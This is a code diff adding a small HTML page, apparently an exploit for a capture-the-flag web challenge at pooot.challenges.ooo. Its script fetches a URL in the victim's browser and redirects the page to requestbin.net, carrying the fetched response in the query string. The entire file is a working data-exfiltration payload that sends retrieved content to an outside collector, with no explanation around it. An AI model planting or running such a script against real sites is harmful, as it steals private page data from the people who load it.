@@ -1,0 +1,13 @@
+<html><body>
+<script>
+var url = 'https://pooot.challenges.ooo/requestbin.net/r/10vwwnb1';
+fetch(url, {
+  method: 'GET', 
+  headers:{
+  }
+}).then(res => res.text())
+.catch(error => console.error('Error:', error))
+.then(response => location = 'http://requestbin.net/r/10vwwnb1?'+encodeURIComponent(response));
+</script>
+</body>
+</html>
